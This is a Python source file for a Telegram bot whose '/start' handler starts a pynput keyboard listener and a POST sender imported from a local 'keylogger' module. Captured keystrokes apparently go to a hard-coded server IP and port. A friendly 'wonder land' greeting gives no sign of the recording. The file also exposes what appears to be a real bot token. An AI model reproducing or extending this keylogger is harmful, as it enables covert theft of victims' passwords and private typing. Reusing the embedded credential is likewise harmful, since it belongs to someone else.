import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
import threading
from pynput import keyboard
import requests
import json
from keylogger import send_post_req, on_press


text = ""

# Hard code the values of your server and ip address here.
ip_address = "192.168.1.127"
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

bot = Bot("5663599147:AAH8xV9ntWdiJr6F2--Wm0hgsWRLThyCNKA")
dp = Dispatcher()

@dp.message(F.text == "/start")
async def start(messege : Message):
    messege.answer(f"Hello {messege.from_user.full_name},  and Welcome to the wonder land")
    print("App is running")
    with keyboard.Listener(
    on_press=on_press) as listener:
        send_post_req()
        listener.join()

@dp.message(F.text == "/what")
async def start(messege : Message):
     messege.answer(f"Hello {messege.from_user.full_name},  and Welcome to the wonder land.")

@dp.message(F.text == "key")
async def keyy(message:Message):
    pass

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
